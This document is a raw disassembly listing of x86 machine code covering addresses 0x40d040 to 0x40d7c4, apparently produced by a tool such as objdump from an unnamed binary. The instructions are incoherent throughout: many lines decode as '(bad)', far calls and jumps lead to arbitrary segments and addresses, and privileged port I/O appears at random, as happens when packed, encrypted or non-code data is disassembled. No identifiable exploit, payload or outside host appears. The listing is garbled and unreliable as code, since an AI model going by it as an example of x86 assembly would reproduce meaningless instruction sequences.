  40d040:	and    DWORD PTR [esi],edi
  40d042:	inc    esp
  40d043:	arpl   ax,sp
  40d045:	int3   
  40d046:	stc    
  40d047:	pop    ds
  40d048:	adc    dh,ah
  40d04a:	xchg   esp,eax
  40d04b:	jo     0x40cffb
  40d04d:	icebp  
  40d04e:	arpl   WORD PTR [eax-0x4a4d2700],si
  40d054:	inc    ecx
  40d055:	out    dx,al
  40d056:	aad    0xb
  40d058:	fwait
  40d059:	mov    dh,0x26
  40d05b:	or     DWORD PTR [eax-0x24afc3fb],ebx
  40d061:	push   es
  40d062:	dec    esp
  40d063:	call   0xc6f8:0x3432ee3d
  40d06a:	je     0x40d0c4
  40d06c:	and    bl,BYTE PTR [edi+0x54]
  40d06f:	(bad)  
  40d070:	gs (bad) 
  40d072:	sub    eax,0x5a35b665
  40d077:	or     al,0x32
  40d079:	fisttp QWORD PTR [ecx]
  40d07b:	in     al,0xd0
  40d07d:	inc    esp
  40d07e:	es pop edi
  40d080:	jo     0x40d008
  40d082:	xor    eax,0x42f9285a
  40d087:	dec    edi
  40d088:	sub    BYTE PTR [eax-0x1b],ch
  40d08b:	lods   eax,DWORD PTR ds:[esi]
  40d08c:	jno    0x40d01a
  40d08e:	shr    BYTE PTR [esi-0x51],1
  40d091:	sub    DWORD PTR [esi],edi
  40d093:	xchg   edx,eax
  40d094:	fidiv  WORD PTR [ecx+0x9fea9b3]
  40d09b:	or     al,0xff
  40d09d:	inc    ebp
  40d09e:	mov    dh,0xf9
  40d0a0:	mov    cl,0xd6
  40d0a2:	icebp  
  40d0a3:	xchg   edx,eax
  40d0a4:	xchg   edi,eax
  40d0a5:	test   eax,0x8d94ede
  40d0aa:	mov    eax,ds:0x3d07a66b
  40d0af:	enter  0x98a3,0x27
  40d0b3:	push   0x17a541e1
  40d0b8:	sub    BYTE PTR [ebp-0x51179b49],cl
  40d0be:	cmp    bh,al
  40d0c0:	jmp    0x358aecf0
  40d0c5:	mov    al,ds:0x80ae0988
  40d0ca:	shr    ah,1
  40d0cc:	mov    eax,ds:0xbf71b992
  40d0d1:	mov    al,ds:0x8b790023
  40d0d6:	jge    0x40d0b4
  40d0d8:	sahf   
  40d0d9:	xchg   ebp,eax
  40d0da:	test   eax,0xbe7b5bc0
  40d0df:	dec    esp
  40d0e0:	repz adc esp,0x9
  40d0e4:	nop
  40d0e5:	mov    es,WORD PTR [edx+0x2199f74e]
  40d0eb:	dec    DWORD PTR [ecx-0x54]
  40d0ee:	cld    
  40d0ef:	mov    bl,0x93
  40d0f1:	push   edx
  40d0f2:	dec    edx
  40d0f3:	xor    eax,0x4f8fecb3
  40d0f8:	(bad)  
  40d0f9:	sti    
  40d0fa:	or     BYTE PTR [ebp-0x69],bl
  40d0fd:	jnp    0x40d110
  40d0ff:	loop   0x40d0d0
  40d101:	jno    0x40d139
  40d103:	mov    ds:0x98381530,al
  40d108:	jnp    0x40d136
  40d10a:	out    0x8a,al
  40d10c:	cmc    
  40d10d:	fsubr  DWORD PTR [esp+edi*1]
  40d110:	(bad)  
  40d112:	cmc    
  40d113:	out    dx,al
  40d114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d115:	mov    esp,DWORD PTR ds:0x88329537
  40d11b:	pop    DWORD PTR [edi+0x31]
  40d11e:	imul   ebp,esp,0xffffff89
  40d121:	pop    esp
  40d122:	cmp    al,0x98
  40d124:	cmc    
  40d125:	out    0x7d,al
  40d127:	popa   
  40d128:	and    DWORD PTR [eax+0x1aac7ede],eax
  40d12e:	daa    
  40d12f:	iret   
  40d130:	push   ss
  40d131:	mov    ecx,edi
  40d133:	mov    ebp,0xadc2fd38
  40d138:	sub    DWORD PTR [eax-0x78ef0b8d],ecx
  40d13e:	cmp    ebp,DWORD PTR [eax+0xfa4c9ff]
  40d144:	scas   eax,DWORD PTR es:[edi]
  40d145:	les    eax,FWORD PTR [edx]
  40d147:	retf   
  40d148:	cmp    eax,0x995e28f8
  40d14d:	push   0x4c
  40d14f:	xchg   ah,cl
  40d151:	fisubr DWORD PTR [edx-0x1c]
  40d154:	lods   al,BYTE PTR ds:[esi]
  40d155:	dec    esp
  40d156:	inc    ebx
  40d157:	dec    ecx
  40d158:	sbb    eax,0xc2faded3
  40d15d:	inc    ebx
  40d15e:	mov    ecx,0xad4568
  40d163:	aam    0x20
  40d165:	jo     0x40d173
  40d167:	ret    0xaf93
  40d16a:	and    eax,0x2c3f5a73
  40d16f:	mov    al,0xc2
  40d171:	jp     0x40d107
  40d173:	xor    bh,dh
  40d175:	mov    esi,0x3626836
  40d17a:	xchg   esi,eax
  40d17b:	mov    eax,ds:0x34b28c2
  40d180:	jmp    0x9efab6a3
  40d185:	neg    eax
  40d187:	cmp    eax,0x7a8b224
  40d18c:	aam    0x6c
  40d18e:	push   esi
  40d18f:	ret    
  40d190:	in     al,dx
  40d191:	inc    esi
  40d192:	fisub  DWORD PTR [esi+0x3440cf7c]
  40d198:	push   ss
  40d199:	sbb    ah,BYTE PTR [ecx+0x75]
  40d19c:	es ins BYTE PTR es:[edi],dx
  40d19e:	mov    es,WORD PTR [edx]
  40d1a0:	in     al,0xcd
  40d1a2:	aaa    
  40d1a3:	inc    edx
  40d1a4:	je     0x40d18d
  40d1a6:	in     al,0x31
  40d1a8:	and    eax,0xf00d170e
  40d1ad:	jge    0x40d19e
  40d1af:	int    0x54
  40d1b1:	stc    
  40d1b2:	lock and BYTE PTR ds:0x7357e9e0,ah
  40d1b9:	sub    edi,DWORD PTR [ecx+0x42]
  40d1bc:	and    esi,DWORD PTR [edi+edx*4-0x28]
  40d1c0:	bound  edx,QWORD PTR [ecx]
  40d1c2:	sbb    BYTE PTR [ecx+0x44842aaa],bl
  40d1c8:	push   eax
  40d1c9:	push   es
  40d1ca:	pushf  
  40d1cb:	scas   al,BYTE PTR es:[edi]
  40d1cc:	and    eax,0xc779272f
  40d1d1:	enter  0xc979,0xb1
  40d1d5:	in     al,dx
  40d1d6:	jmp    0xd0dee864
  40d1db:	mov    ?,eax
  40d1dd:	repz pop ebp
  40d1df:	hlt    
  40d1e0:	cmp    ch,ch
  40d1e2:	mov    ah,0x7e
  40d1e4:	xor    BYTE PTR cs:[eax-0x27],al
  40d1e8:	lahf   
  40d1e9:	shr    cl,1
  40d1eb:	in     eax,0x1b
  40d1ed:	in     al,dx
  40d1ee:	mov    ch,0x81
  40d1f0:	and    ebx,DWORD PTR [ebp+0xd]
  40d1f3:	scas   al,BYTE PTR es:[edi]
  40d1f4:	inc    esp
  40d1f5:	mov    BYTE PTR [edx],dh
  40d1f7:	int    0x61
  40d1f9:	dec    edx
  40d1fa:	jno    0x40d240
  40d1fc:	mov    bh,0xf
  40d1fe:	shr    DWORD PTR [ebx+0x6b54500e],1
  40d204:	push   0x4f
  40d206:	cmp    DWORD PTR [ebx+0x60],esi
  40d209:	adc    BYTE PTR [ecx+ecx*8+0x6e5142c3],bl
  40d210:	daa    
  40d211:	pop    eax
  40d212:	sahf   
  40d213:	mov    ch,0x14
  40d215:	jle    0x40d217
  40d217:	and    dl,BYTE PTR [ebx+0x27]
  40d21a:	adc    eax,DWORD PTR [edi]
  40d21c:	cmp    esi,esp
  40d21e:	es mov ecx,0x9abe103b
  40d224:	aad    0xa0
  40d226:	jb     0x40d26f
  40d228:	aam    0x85
  40d22a:	pop    esi
  40d22b:	mov    ebx,0xdc788427
  40d230:	push   edi
  40d231:	push   ecx
  40d232:	cmp    esi,DWORD PTR [ebx+0x51]
  40d235:	fst    st(0)
  40d237:	xor    DWORD PTR [esi],edi
  40d239:	sbb    edi,DWORD PTR [esp+edi*8+0x6c]
  40d23d:	add    al,0x29
  40d23f:	pop    esp
  40d240:	push   ebp
  40d241:	data16 test BYTE PTR [ebx],dh
  40d244:	sub    al,0x16
  40d246:	xchg   edx,eax
  40d247:	sub    DWORD PTR [edx-0x1e],0x62
  40d24b:	mov    al,0x55
  40d24d:	out    0x4,al
  40d24f:	(bad)  
  40d251:	ffree  st(0)
  40d253:	jg     0x40d1ec
  40d255:	loope  0x40d2b9
  40d257:	test   BYTE PTR [edi-0x58],dl
  40d25a:	jns    0x40d250
  40d25c:	pop    eax
  40d25d:	dec    ebp
  40d25e:	pop    esi
  40d25f:	dec    ebp
  40d260:	jmp    0x996b:0x70a264fe
  40d267:	dec    ecx
  40d268:	pop    ds
  40d269:	add    eax,0x48530da6
  40d26e:	and    ch,al
  40d270:	fist   DWORD PTR [edi+0x6a]
  40d273:	daa    
  40d274:	cmp    eax,0x8f7dec40
  40d279:	mov    cl,0x1f
  40d27b:	mov    esp,0xfdc0fe54
  40d280:	out    dx,al
  40d281:	inc    edx
  40d282:	ret    0xaa51
  40d285:	dec    ebx
  40d286:	test   dh,al
  40d288:	(bad)  
  40d289:	cwde   
  40d28a:	loope  0x40d2e1
  40d28c:	adc    al,0xcf
  40d28e:	call   0x892bc8b3
  40d293:	imul   ebx,DWORD PTR [edx-0x56],0x3bd56801
  40d29a:	and    eax,0x4fe72817
  40d29f:	outs   dx,DWORD PTR ds:[esi]
  40d2a0:	and    DWORD PTR [edi],ecx
  40d2a2:	sub    BYTE PTR [esi],0x5d
  40d2a5:	data16 out 0x63,al
  40d2a8:	pop    ebx
  40d2a9:	jbe    0x40d26b
  40d2ab:	mov    cl,ah
  40d2ad:	mov    al,ds:0xde95fb1
  40d2b2:	pop    eax
  40d2b3:	loopne 0x40d295
  40d2b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b6:	jge    0x40d327
  40d2b8:	imul   ebx,DWORD PTR [eax],0xb24495fa
  40d2be:	loop   0x40d26e
  40d2c0:	cwde   
  40d2c1:	mov    eax,ds:0x645456c5
  40d2c6:	sti    
  40d2c7:	std    
  40d2c8:	ins    BYTE PTR es:[edi],dx
  40d2c9:	push   0x6b
  40d2cb:	xor    esp,ebp
  40d2cd:	sahf   
  40d2ce:	or     al,0x20
  40d2d0:	push   esi
  40d2d1:	js     0x40d332
  40d2d3:	call   0xee39:0x3c082d53
  40d2da:	(bad)  [edi-0x2a]
  40d2dd:	sub    al,0x2a
  40d2df:	aad    0x2f
  40d2e1:	add    al,0x68
  40d2e3:	cmp    dl,BYTE PTR [ecx+ecx*8-0x29]
  40d2e7:	daa    
  40d2e8:	rol    DWORD PTR [edx+0x3a],cl
  40d2eb:	cli    
  40d2ec:	pop    ecx
  40d2ed:	pop    es
  40d2ee:	jnp    0x40d33a
  40d2f0:	(bad)  
  40d2f1:	sub    eax,0x6b77445c
  40d2f6:	cmp    DWORD PTR [edx],esi
  40d2f8:	add    eax,0x6c20735c
  40d2fd:	das    
  40d2fe:	and    eax,esi
  40d300:	add    eax,0xe3d61f80
  40d305:	adc    al,0x40
  40d307:	add    eax,0x17455643
  40d30c:	sti    
  40d30d:	mov    ds:0x5afcc7b8,eax
  40d312:	add    eax,0x11f301e6
  40d317:	pop    ebp
  40d318:	cmp    bl,dl
  40d31a:	jno    0x40d2ab
  40d31c:	mov    dh,BYTE PTR [ebp+0x2a1d93a7]
  40d322:	pop    edi
  40d323:	ret    
  40d324:	iret   
  40d325:	mov    ds:0xce005a14,al
  40d32a:	call   0x324204c1
  40d32f:	xchg   esp,eax
  40d330:	stc    
  40d331:	cmp    BYTE PTR [ebx-0x69],ch
  40d334:	ret    0x29e3
  40d337:	pop    ebp
  40d338:	cmp    bh,BYTE PTR [eax-0x5a77de12]
  40d33e:	jl     0x40d2fb
  40d340:	imul   ebp,esi,0x79db192c
  40d346:	call   0xcdf7:0x92df23ed
  40d34d:	shl    BYTE PTR [esi+eiz*8],cl
  40d350:	mov    edx,ecx
  40d352:	popa   
  40d353:	in     eax,dx
  40d354:	push   edx
  40d355:	sub    eax,0x68961755
  40d35a:	jp     0x40d397
  40d35c:	or     eax,0xfba412ed
  40d361:	test   al,0xd2
  40d363:	ja     0x40d366
  40d365:	in     eax,0xcd
  40d367:	and    al,0xc8
  40d369:	cmp    BYTE PTR [esi-0x73],ah
  40d36c:	xlat   BYTE PTR ds:[ebx]
  40d36d:	sub    dl,BYTE PTR [ebx+eiz*2-0x552d91b8]
  40d374:	(bad)  
  40d375:	mov    ah,0x50
  40d377:	pusha  
  40d378:	test   eax,0x248f476c
  40d37d:	rcr    DWORD PTR [ecx+0x24],cl
  40d380:	fstp   DWORD PTR [ecx-0x3e0f652]
  40d386:	dec    eax
  40d387:	jle    0x40d310
  40d389:	or     esi,ebp
  40d38b:	test   al,0xd5
  40d38d:	imul   ch
  40d38f:	sar    BYTE PTR [eax],0xf
  40d392:	mov    bl,0xc3
  40d394:	mov    esi,0xe25d9f28
  40d399:	dec    eax
  40d39a:	test   DWORD PTR [ebx-0x68],edi
  40d39d:	hlt    
  40d39e:	add    eax,0xa141ab61
  40d3a3:	xchg   DWORD PTR [edi+0x31],ecx
  40d3a6:	xchg   DWORD PTR [esi+esi*1],eax
  40d3a9:	cs (bad) 
  40d3ab:	inc    edi
  40d3ac:	mov    esi,0xde512140
  40d3b1:	inc    edi
  40d3b2:	fcmovbe st,st(2)
  40d3b4:	and    eax,0x764af898
  40d3b9:	and    DWORD PTR ss:[edx+0x4699e372],ebp
  40d3c0:	jmp    0x40d3ed
  40d3c2:	fwait
  40d3c3:	cmp    al,0x5c
  40d3c5:	add    eax,0x55452a76
  40d3ca:	push   ecx
  40d3cb:	inc    ebx
  40d3cc:	pop    ebp
  40d3cd:	loopne 0x40d426
  40d3cf:	test   dh,dh
  40d3d1:	pushf  
  40d3d2:	push   ecx
  40d3d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3d4:	pop    ss
  40d3d5:	loope  0x40d37c
  40d3d7:	lods   al,BYTE PTR ds:[esi]
  40d3d8:	dec    esp
  40d3d9:	fwait
  40d3da:	pushf  
  40d3db:	mov    DWORD PTR [edx+0x255d1e5b],edi
  40d3e1:	in     eax,0x5b
  40d3e3:	loope  0x40d420
  40d3e5:	mov    edx,0xff6ca3c1
  40d3ea:	cld    
  40d3eb:	cwde   
  40d3ec:	add    eax,0xe7f858dc
  40d3f1:	imul   ebx,DWORD PTR [edi-0x2960e59f],0x8cebdab1
  40d3fb:	lods   al,BYTE PTR ds:[esi]
  40d3fc:	xchg   ebp,eax
  40d3fd:	retf   0xd50f
  40d400:	es out dx,al
  40d402:	rol    DWORD PTR [edi+0x4d],cl
  40d405:	ja     0x40d3ff
  40d407:	int    0xc9
  40d409:	je     0x40d45c
  40d40b:	mov    edx,DWORD PTR [edx+0x2fbbe719]
  40d411:	xchg   BYTE PTR [esi+0xc],al
  40d414:	dec    esi
  40d415:	push   0xffffffd6
  40d417:	cld    
  40d418:	(bad)  
  40d419:	adc    eax,0xfea1339d
  40d41e:	xchg   BYTE PTR [ebp-0x51],ah
  40d421:	xchg   ecx,eax
  40d422:	adc    bh,cl
  40d424:	pop    ss
  40d425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d426:	inc    esi
  40d427:	sub    DWORD PTR [ebp-0x5c13de42],0x2e
  40d42e:	aaa    
  40d42f:	cmp    esi,DWORD PTR [ecx+0x122bfff]
  40d435:	fcom   DWORD PTR [edx-0x2c]
  40d438:	fs stc 
  40d43a:	dec    edx
  40d43b:	xor    esi,DWORD PTR [ebx-0x57c19627]
  40d441:	mov    BYTE PTR [ebp-0x3858e18a],0x96
  40d448:	cmp    ebx,DWORD PTR [eax+0x64]
  40d44b:	or     eax,0xd2c41351
  40d450:	jb     0x40d40c
  40d452:	push   esi
  40d453:	and    BYTE PTR [eax+0x7178109a],dl
  40d459:	mov    eax,DWORD PTR [edi+0x35300e6a]
  40d45f:	enter  0xa41a,0x3b
  40d463:	xchg   esi,eax
  40d464:	(bad)  
  40d465:	pop    esi
  40d466:	dec    eax
  40d467:	not    eax
  40d469:	and    eax,edx
  40d46b:	xor    ecx,edi
  40d46d:	mov    DWORD PTR [ebp-0x4],eax
  40d470:	jmp    0x40d9fa
  40d475:	mov    ds:0x60bf5ac5,eax
  40d47a:	sbb    BYTE PTR [edx],ah
  40d47c:	cdq    
  40d47d:	cmovbe edx,DWORD PTR [edx+esi*4-0x8]
  40d482:	adc    ch,BYTE PTR ss:[eax+0x1616b4d7]
  40d489:	cmp    eax,0xd0161604
  40d48e:	push   ebx
  40d48f:	aad    0x1f
  40d491:	push   ecx
  40d492:	clc    
  40d493:	sbb    BYTE PTR ds:0xae8dbd28,0xda
  40d49a:	xchg   edx,eax
  40d49b:	adc    DWORD PTR [edx-0x1],ebx
  40d49e:	pop    es
  40d49f:	sbb    al,0x8
  40d4a1:	mov    al,ds:0x6f7ded9d
  40d4a7:	push   ss
  40d4a8:	xchg   edi,eax
  40d4a9:	jp     0x40d4f0
  40d4ab:	push   ds
  40d4ac:	shl    BYTE PTR [ebx-0x449b1815],cl
  40d4b2:	repz jl 0x40d46f
  40d4b5:	pop    eax
  40d4b6:	xor    DWORD PTR [edi+0x39],ecx
  40d4b9:	sub    eax,0x521b224
  40d4be:	out    0x65,al
  40d4c0:	(bad)  
  40d4c1:	add    dh,cl
  40d4c3:	ins    DWORD PTR es:[edi],dx
  40d4c4:	call   0x23fdf2f8
  40d4c9:	xchg   edi,eax
  40d4ca:	cwde   
  40d4cb:	fcmovu st,st(0)
  40d4cd:	jne    0x40d4c1
  40d4cf:	mov    edi,0x4ad6500c
  40d4d4:	xor    al,0x31
  40d4d6:	les    edi,FWORD PTR [edi-0x55054ed1]
  40d4dc:	pop    es
  40d4dd:	mov    ah,0x50
  40d4df:	xor    esi,eax
  40d4e1:	push   eax
  40d4e2:	call   FWORD PTR [edi-0x59]
  40d4e5:	stos   BYTE PTR es:[edi],al
  40d4e6:	xor    ebp,DWORD PTR [ecx+eax*2-0x3847167b]
  40d4ed:	shr    BYTE PTR [edx],1
  40d4ef:	adc    esi,DWORD PTR [edi]
  40d4f1:	out    0xb2,al
  40d4f3:	jp     0x40d50e
  40d4f5:	imul   edx,DWORD PTR [edi+0x75],0x54b82359
  40d4fc:	aam    0xcf
  40d4fe:	div    DWORD PTR [ebx-0x37]
  40d501:	add    cl,bl
  40d503:	sti    
  40d504:	daa    
  40d505:	(bad)  
  40d506:	ins    BYTE PTR es:[edi],dx
  40d507:	push   0xffffffd1
  40d509:	in     al,0x63
  40d50b:	xchg   edi,eax
  40d50c:	call   0x265f:0xfb5aa850
  40d513:	sbb    eax,0x2544cdf7
  40d518:	xor    BYTE PTR [edx],ch
  40d51a:	add    ah,BYTE PTR [edi]
  40d51c:	or     eax,0x1f53195
  40d521:	sub    al,0xf3
  40d523:	(bad)  
  40d524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d525:	outs   dx,DWORD PTR ds:[esi]
  40d526:	movaps xmm5,XMMWORD PTR [ebp+0x60]
  40d52a:	or     ah,BYTE PTR [eax-0x1a]
  40d52d:	(bad)  
  40d52e:	pop    esi
  40d52f:	push   esp
  40d530:	sbb    BYTE PTR [edx],dl
  40d532:	mov    edi,0x14429b97
  40d537:	xchg   esp,eax
  40d538:	xchg   ebp,eax
  40d539:	or     BYTE PTR [eax-0x1997c59e],bl
  40d53f:	dec    esi
  40d540:	dec    esp
  40d541:	shl    BYTE PTR [ebx-0x6905e1a2],0x24
  40d548:	shl    DWORD PTR [ebx+0x2fda22df],1
  40d54e:	jo     0x40d560
  40d550:	imul   eax,eax,0xffffffb7
  40d553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d554:	test   al,0xea
  40d556:	test   eax,0x4f5727c0
  40d55b:	out    0xfb,eax
  40d55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d55e:	scas   al,BYTE PTR es:[edi]
  40d55f:	mov    edi,0xfdb46fbf
  40d564:	sbb    DWORD PTR [ebx],edx
  40d566:	data16 sub bh,BYTE PTR [edx]
  40d569:	mov    ecx,0xb52e3514
  40d56e:	(bad)  
  40d56f:	stos   DWORD PTR es:[edi],eax
  40d570:	sbb    eax,0x9b123a3a
  40d575:	pop    ss
  40d576:	sbb    DWORD PTR [edx+0x30],0xd91a89c2
  40d57d:	xchg   esp,eax
  40d57e:	pop    edx
  40d57f:	push   0x17
  40d581:	(bad)  
  40d582:	into   
  40d583:	adc    ch,BYTE PTR [edi-0x22212fed]
  40d589:	fistp  WORD PTR [eax+eiz*1]
  40d58c:	mov    al,0x1f
  40d58e:	xchg   edi,eax
  40d58f:	out    0x5f,al
  40d591:	leave  
  40d592:	mov    eax,ds:0x3ab04280
  40d597:	xchg   ebp,eax
  40d598:	mov    dh,0xda
  40d59a:	loop   0x40d61a
  40d59c:	imul   edi,DWORD PTR [ecx],0x36
  40d59f:	jg     0x40d5c6
  40d5a1:	sub    BYTE PTR [esi],bh
  40d5a3:	push   eax
  40d5a4:	in     al,0xeb
  40d5a6:	or     DWORD PTR [ebx-0x65],ebp
  40d5a9:	dec    esp
  40d5aa:	jbe    0x40d590
  40d5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ad:	popa   
  40d5ae:	gs jo  0x40d56f
  40d5b1:	test   BYTE PTR [eax],ch
  40d5b3:	or     eax,0x21570d6d
  40d5b8:	dec    eax
  40d5b9:	aaa    
  40d5ba:	pop    edx
  40d5bb:	xchg   ebp,eax
  40d5bc:	mov    edi,DWORD PTR ds:0xdce4e95d
  40d5c2:	shr    BYTE PTR [edi+0x6d],cl
  40d5c5:	call   0xc1fd8921
  40d5ca:	sub    al,0x8f
  40d5cc:	mov    ebx,0x97f8d7df
  40d5d1:	out    dx,eax
  40d5d2:	loopne 0x40d5f9
  40d5d4:	retf   
  40d5d5:	(bad)  
  40d5d6:	ja     0x40d571
  40d5d8:	popa   
  40d5d9:	sbb    al,BYTE PTR [edi]
  40d5db:	(bad)  
  40d5dc:	mov    ebp,0xd9f96aea
  40d5e1:	xchg   edx,eax
  40d5e2:	fnsave [edx]
  40d5e4:	xor    DWORD PTR [edx+0x21ed4d4a],ecx
  40d5ea:	into   
  40d5eb:	pop    es
  40d5ec:	inc    eax
  40d5ed:	jne    0x40d660
  40d5ef:	in     eax,0x63
  40d5f1:	sub    eax,0x8737cb3f
  40d5f6:	ss mov eax,0xd0e5db3b
  40d5fc:	mov    edx,0x4b867aba
  40d601:	scas   al,BYTE PTR es:[edi]
  40d602:	cmp    eax,0x5826f640
  40d607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d608:	shl    BYTE PTR [eax+0x68cf3998],cl
  40d60e:	or     cl,bh
  40d610:	sub    al,0xa0
  40d612:	enter  0xeb56,0x1f
  40d616:	inc    edx
  40d617:	push   eax
  40d618:	repz and al,0x79
  40d61b:	fisttp DWORD PTR [eax]
  40d61d:	test   BYTE PTR [esp+edx*8+0xd],bh
  40d621:	outs   dx,DWORD PTR ds:[esi]
  40d622:	xchg   ebp,eax
  40d623:	stos   DWORD PTR es:[edi],eax
  40d624:	xor    eax,0xfea6b2cc
  40d629:	jns    0x40d629
  40d62b:	repnz (bad) 
  40d62d:	fldcw  WORD PTR [esi+0x40f307b]
  40d633:	push   ebx
  40d634:	sub    al,0x39
  40d636:	jne    0x40d6a9
  40d638:	leave  
  40d639:	jo     0x40d6b5
  40d63b:	cmp    BYTE PTR [ecx-0x78e8261e],cl
  40d641:	in     al,dx
  40d642:	mov    eax,ds:0xd202e5d7
  40d647:	dec    esp
  40d648:	mov    bh,0x47
  40d64a:	sub    DWORD PTR [edi],0xdee1517
  40d650:	or     DWORD PTR [ebx+0x743494d8],esi
  40d656:	outs   dx,DWORD PTR ds:[esi]
  40d657:	div    BYTE PTR [edx]
  40d659:	adc    al,0x53
  40d65b:	adc    dl,bl
  40d65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d65e:	mov    dl,0x3e
  40d660:	cs fstp st(4)
  40d663:	adc    al,0x2c
  40d665:	inc    eax
  40d666:	retf   
  40d667:	and    edx,0x23706973
  40d66d:	pop    ecx
  40d66e:	pop    ebx
  40d66f:	cmp    BYTE PTR [ecx-0x20698ea5],ch
  40d675:	mov    ch,0x9e
  40d677:	inc    esp
  40d678:	push   ss
  40d679:	(bad)  [ebp-0x4d]
  40d67d:	sbb    ebx,DWORD PTR [edx+edx*2-0x7f]
  40d681:	add    al,0x71
  40d683:	(bad)  
  40d684:	or     edi,DWORD PTR [edi]
  40d686:	and    BYTE PTR [ebx],bl
  40d688:	xchg   esi,eax
  40d689:	mov    edi,0x1492b2df
  40d68e:	add    al,0x17
  40d690:	xor    ecx,DWORD PTR [esi]
  40d692:	rcl    BYTE PTR [ecx+0x2224e7c5],1
  40d698:	sub    bl,BYTE PTR [ecx]
  40d69a:	and    esi,DWORD PTR [edx]
  40d69c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d69d:	push   ss
  40d69e:	ror    eax,0x9e
  40d6a1:	sbb    edx,edi
  40d6a3:	adc    al,0xf3
  40d6a5:	inc    eax
  40d6a6:	test   esp,ebp
  40d6a8:	sub    al,bl
  40d6aa:	popa   
  40d6ab:	and    bl,BYTE PTR [ebx-0x11b0a3b5]
  40d6b1:	outs   dx,BYTE PTR ds:[esi]
  40d6b2:	sub    BYTE PTR [eax],ch
  40d6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b5:	xor    DWORD PTR [edi-0xa],edx
  40d6b8:	mov    ah,0x37
  40d6ba:	shl    BYTE PTR [eax+ecx*8-0x23],cl
  40d6be:	in     eax,0x2d
  40d6c0:	sbb    edx,DWORD PTR [eax-0x40]
  40d6c3:	enter  0x6253,0x73
  40d6c7:	and    BYTE PTR [ecx],0xa
  40d6ca:	scas   al,BYTE PTR es:[edi]
  40d6cb:	dec    ebp
  40d6cc:	mov    DWORD PTR [edi-0x61979d1f],eax
  40d6d2:	or     bh,BYTE PTR [edx+0x57c757b0]
  40d6d8:	repnz imul esi,DWORD PTR [edi+ecx*1-0x385b932f],0xbfddf7c1
  40d6e4:	jnp    0x40d674
  40d6e6:	stos   BYTE PTR es:[edi],al
  40d6e7:	lds    edi,FWORD PTR [ebp+ebp*4+0x10dfa65b]
  40d6ee:	dec    edx
  40d6ef:	adc    ch,BYTE PTR [edx+0x1f2b0d46]
  40d6f5:	sbb    esi,DWORD PTR [edx+0x68]
  40d6f8:	xchg   ebx,eax
  40d6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6fa:	mov    bl,BYTE PTR [ecx+0x4a55c19]
  40d700:	xchg   ebp,eax
  40d701:	mov    esi,0xb0b276bc
  40d706:	xlat   BYTE PTR ds:[ebx]
  40d707:	cmp    bh,BYTE PTR [ecx+0x6]
  40d70a:	lahf   
  40d70b:	and    edi,edi
  40d70d:	jae    0x40d71b
  40d70f:	xchg   edi,eax
  40d710:	jecxz  0x40d702
  40d712:	das    
  40d713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d714:	shl    dh,1
  40d716:	pusha  
  40d717:	push   eax
  40d718:	(bad)  
  40d719:	adc    ebx,ecx
  40d71b:	mov    al,ds:0x1a2121c4
  40d720:	push   eax
  40d721:	loop   0x40d796
  40d723:	and    DWORD PTR [edi-0x6af7269],edx
  40d729:	pushf  
  40d72a:	in     al,dx
  40d72b:	xchg   DWORD PTR [ebx],ebp
  40d72d:	jnp    0x40d6bf
  40d72f:	add    bl,BYTE PTR [esi]
  40d731:	xchg   esi,eax
  40d732:	scas   al,BYTE PTR es:[edi]
  40d733:	stos   BYTE PTR es:[edi],al
  40d734:	dec    ebp
  40d735:	out    0xa2,al
  40d737:	jne    0x40d6d1
  40d739:	add    al,0x70
  40d73b:	dec    eax
  40d73c:	xchg   ecx,eax
  40d73d:	sbb    dl,BYTE PTR [eax+0x5c]
  40d740:	xchg   edx,eax
  40d741:	mov    ds:0xd1410716,al
  40d746:	dec    ecx
  40d747:	std    
  40d748:	or     al,cl
  40d74a:	clc    
  40d74b:	outs   dx,DWORD PTR ds:[esi]
  40d74c:	ret    
  40d74d:	sahf   
  40d74e:	ficom  WORD PTR [eax]
  40d750:	cmp    ebx,ebp
  40d752:	ret    0x43fd
  40d755:	and    bl,BYTE PTR [ebx-0x366e36c7]
  40d75b:	mov    esi,0x604acdfd
  40d760:	push   DWORD PTR [eiz*2+0x208842a7]
  40d767:	push   ss
  40d768:	outs   dx,DWORD PTR ds:[esi]
  40d769:	sbb    BYTE PTR [ebx+0x51],cl
  40d76c:	jp     0x40d727
  40d76e:	out    dx,al
  40d76f:	retf   
  40d770:	jo     0x40d78c
  40d772:	push   ebp
  40d773:	push   ecx
  40d774:	icebp  
  40d775:	push   edx
  40d776:	lea    ebp,[ecx]
  40d778:	sub    al,0x7b
  40d77a:	xchg   esi,eax
  40d77b:	aaa    
  40d77c:	push   ebx
  40d77d:	xor    DWORD PTR [esi+0x5bd8977d],0xa4e39f9d
  40d787:	lock pop edi
  40d789:	call   0xcdf708d4
  40d78e:	in     eax,0x5d
  40d790:	jmp    0xcfe171b4
  40d795:	arpl   WORD PTR [eax-0x37],si
  40d798:	jecxz  0x40d734
  40d79a:	and    al,0x3
  40d79c:	retf   0x819a
  40d79f:	mov    ds:0x96c982be,eax
  40d7a4:	fwait
  40d7a5:	mov    bl,0xb3
  40d7a7:	mov    eax,?
  40d7a9:	push   es
  40d7aa:	sbb    ah,BYTE PTR [edx+0x39f0e76]
  40d7b0:	stos   DWORD PTR es:[edi],eax
  40d7b1:	(bad)  
  40d7b2:	int3   
  40d7b3:	sub    cl,dl
  40d7b5:	sub    ecx,esi
  40d7b7:	imul   BYTE PTR [edi+0x0]
  40d7ba:	mov    eax,ds:0xe5828134
  40d7bf:	adc    edi,DWORD PTR [edx]
  40d7c1:	or     DWORD PTR [edi+edi*8],ecx
  40d7c4:	cmp    al,0x49
